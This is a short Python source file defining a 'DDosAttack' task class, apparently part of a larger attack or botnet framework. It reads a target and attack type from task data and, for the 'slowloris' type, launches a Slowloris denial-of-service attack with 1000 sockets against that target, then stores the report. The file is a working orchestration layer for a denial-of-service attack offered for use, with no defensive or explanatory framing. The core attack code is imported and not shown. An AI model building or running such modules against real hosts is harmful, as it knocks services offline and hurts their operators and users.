#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app.models import Task

from app.modules.attacks import Slowloris


class DDosAttack(Task):
    def __init__(self, task_data):
        super().__init__(task_data)
        self.target = self.task_content['target']
        self.attack_type = self.task_content['attack_type']
        from app.components import logger
        logger.log(self.target, 'DEBUG')
        logger.log(self.attack_type, 'DEBUG')

    def start(self):
        # here comes the sugar
        from app.components import logger
        logger.log('starting ddos module...', 'OTHER')

        if self.attack_type == 'slowloris':
            attack = Slowloris(self.target, to_stop_at=self.to_stop_at, n_sockets=1000)
            attack.run()
            logger.log('slowloris executed', 'OTHER')
            self.result = attack.report
        Task.start(self)
        # ...
        # return ...


    def run(self):
        return Task.run(self)

